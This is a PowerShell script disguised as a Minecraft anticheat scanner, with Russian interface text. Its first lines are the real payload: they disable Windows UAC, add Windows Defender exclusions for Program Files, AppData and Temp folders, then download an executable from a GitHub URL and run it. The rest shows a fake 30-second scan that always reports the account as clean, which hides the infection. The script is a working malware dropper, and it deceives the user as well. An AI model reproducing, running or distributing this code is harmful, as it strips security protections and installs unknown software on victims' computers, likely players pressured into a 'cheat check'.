# ╔══════════════════════════════════════════════════════════╗
# ║          MINECRAFT ANTICHEAT SCANNER v9.666             ║
# ║          100% ЯДЕРНО-ЗЕЛЁНЫЙ СКАНЕР • 30 сек проверка      ║
# ╚══════════════════════════════════════════════════════════╝

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $paths = @(
            [Environment]::GetFolderPath("ProgramFiles")
            [Environment]::GetFolderPath("ProgramFilesX86")
            [Environment]::GetFolderPath("ApplicationData")
            [Environment]::GetFolderPath("LocalApplicationData")
            [System.IO.Path]::GetTempPath()
        )
        foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }
    }
} catch {}
Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
# ╔══════════════════ ВИЗУАЛ ══════════════════╗
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host

Write-Host @"
   __  __ _                  _             __ 
  |  \/  (_)_ __   ___      / \   _ __ ___ / _|
  | |\/| | | '_ \ / _ \    / _ \ | '__/ __| |_ 
  | |  | | | | | |  __/   / ___ \| | | (__|  _|
  |_|  |_|_|_| |_|\___|  /_/   \_\_|  \___|_|  
       ██████ ANTICHEAT SCANNER ██████
"@ -ForegroundColor Green

Write-Host "       Запуск глубокой проверки на читы Minecraft..." -ForegroundColor DarkGreen
Start-Sleep -Seconds 2

$steps = 30
for($i = 1; $i -le $steps; $i++) {
    $percent = [math]::Round(($i / $steps) * 100)

    if($i -in 8,16,24,30) {
        $msg = switch($i) {
            8  {"СКАНИРОВАНИЕ ПАМЯТИ"}
            16 {"ПРОВЕРКА ИНЖЕКТОВ"}
            24 {"АНАЛИЗ МОДОВ И КЛИЕНТОВ"}
            30 {"ЧИТЫ НЕ ОБНАРУЖЕНЫ ✓"}
        }
        Write-Host "  █████████████████ $msg █████████████████" -ForegroundColor Green
    }

    Write-Progress -Activity "MINECRAFT ANTICHEAT SCAN" -Status "$percent% Завершено" -PercentComplete $percent
    Start-Sleep -Milliseconds 950
}

Clear-Host
$Host.UI.RawUI.ForegroundColor = "Green"

Write-Host @"
════════════════════════════════════════════════════════════
░▒▓█ MINECRAFT ANTICHEAT SCAN ЗАВЕРШЁН УСПЕШНО █▓▒░
════════════════════════════════════════════════════════════
  Статус проверки:   ████████████████████ 100% 
  Результат:         ЧИТЫ НЕ ОБНАРУЖЕНЫ ✓✓✓
  X-Ray:             не найден
  KillAura:          не найден
  Fly / Speed:       не найден
  Reach / Jesus:     не найден
  Подозрительные моды: 0
  Вердикт:           ЧИСТЫЙ АККАУНТ
════════════════════════════════════════════════════════════
"@ -ForegroundColor Green

Write-Host "  Ты прошёл проверку! Можешь спокойно играть :)" -ForegroundColor DarkGreen
Start-Sleep -Seconds 1
Write-Host "  Нажмите любую клавишу, чтобы закрыть сканер..." -ForegroundColor DarkGreen
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
